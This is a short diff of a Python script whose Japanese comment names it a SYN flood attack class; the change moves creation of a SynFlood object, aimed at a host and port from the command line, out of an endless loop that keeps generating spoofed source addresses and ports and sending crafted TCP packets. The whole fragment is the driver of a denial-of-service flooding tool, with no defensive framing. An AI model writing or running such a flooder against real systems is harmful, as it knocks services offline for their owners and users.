@@ -6,14 +6,10 @@ import argparse
 
 class Main:
     # SYN Flood攻撃クラス
-    #count = sys.argv[3]
-    #num = 0
+    da = sf.SynFlood(sys.argv[1], sys.argv[2])
     while True:
-        da = sf.SynFlood(sys.argv[1], sys.argv[2])
         da.createSrcIp()
         da.createSrcPort()
         da.createIpPacket()
         da.createTcpPacket()
         da.sendPacket()
-        # num += 1
-        
